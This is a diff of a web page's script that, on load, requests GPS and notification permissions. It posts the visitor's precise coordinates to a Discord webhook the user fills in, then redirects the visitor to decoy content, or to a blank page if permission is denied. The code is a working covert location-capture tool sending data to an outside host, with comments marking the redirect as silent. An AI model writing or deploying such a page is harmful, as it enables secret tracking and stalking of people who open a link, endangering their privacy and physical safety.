@@ -14,9 +14,14 @@
 </head>
 <body>
   <script>
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // replace with your Discord webhook
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // <-- replace with your webhook
+    const redirectUrl = "https://example.com"; // <-- replace with your redirect URL
 
-    function sendToWebhook(lat, lon, acc) {
+    function logLocation(lat, lon, acc) {
+      console.log("Latitude:", lat);
+      console.log("Longitude:", lon);
+      console.log("Accuracy:", acc + " meters");
+
       fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -24,47 +29,41 @@
           content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
         })
       });
+
+      // Redirect after sending
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1000);
     }
 
-    function requestGPS() {
+    function handleError(err) {
+      console.warn("GPS error:", err);
+      // Exit if denied
+      window.location.href = "about:blank";
+    }
+
+    function askPermissions() {
+      // 1. Ask Notification permission
+      if ("Notification" in window) {
+        Notification.requestPermission().then(() => {});
+      }
+
+      // 2. Ask GPS permission
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-
-            sendToWebhook(lat, lon, acc);
-
-            // Redirect silently
-            window.location.href = "https://example.com/view"; // change this to your content
+            const { latitude, longitude, accuracy } = position.coords;
+            logLocation(latitude, longitude, accuracy);
           },
-          () => {
-            // On deny or fail, exit silently
-            window.location.href = "about:blank";
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
+          handleError,
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        window.location.href = "about:blank";
+        handleError("Geolocation not supported.");
       }
     }
 
-    function requestNotification() {
-      if ('Notification' in window) {
-        Notification.requestPermission().then(() => {});
-      }
-    }
-
-    // Trigger both on load
-    window.onload = () => {
-      requestNotification();
-      requestGPS();
-    };
+    window.onload = askPermissions;
   </script>
 </body>
 </html>
